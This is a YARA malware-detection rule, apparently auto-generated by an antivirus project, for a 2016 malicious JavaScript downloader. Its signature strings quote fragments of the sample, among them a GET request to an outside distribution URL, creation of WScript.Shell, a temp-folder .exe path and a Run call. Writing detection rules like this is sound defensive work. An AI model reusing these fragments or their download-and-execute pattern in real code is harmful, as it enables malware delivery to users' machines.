rule sig_20160329_0826bc2f4ddccc6dd48edb86bbe5e172 {
  meta:
    description = "datamaliciousorder - file 20160329_0826bc2f4ddccc6dd48edb86bbe5e172.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1bef7402a51573591992f31ede630d21ad9404c534d5b909aedb04db75d5a9c7"

  strings:
    $s1  = "function LS() {return M[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jlMROIMC.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[E0](u() * 11); if (a[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function J(cX, a0){Lc = Lc * 1; return cX - a0;};" fullword ascii
    $s4  = "var M = function mI() {return WScript[H](\"WScript.Shell\");}(), Y = 11;" fullword ascii
    $s5  = "a[GY](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s6  = "function Kp(){return \"\" + j0;};" fullword ascii
    $s7  = "function CC(LV){M[\"Run\"](LV, Lc, Lc);};" fullword ascii
    $s8  = "function Ho() {return ((X == true) && (X == uP)) ? 1 : Lc;};" fullword ascii
    $s9  = " while (Qg){" fullword ascii
    $s10 = "var di = new this[\"Date\"]();" fullword ascii
    $s11 = "function S()" fullword ascii
    $s12 = "function E(){return H;};" fullword ascii
    $s13 = "function en(w) {var k = (1, 2, 3, 4, 5, w); return k;};" fullword ascii
    $s14 = "return J(j1, u0);" fullword ascii
    $s15 = "function u(){return 22;};" fullword ascii
    $s16 = "uP = true; " fullword ascii
    $s17 = "var wx = false;" fullword ascii
    $s18 = "var uP = false;" fullword ascii
    $s19 = "} catch(f){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}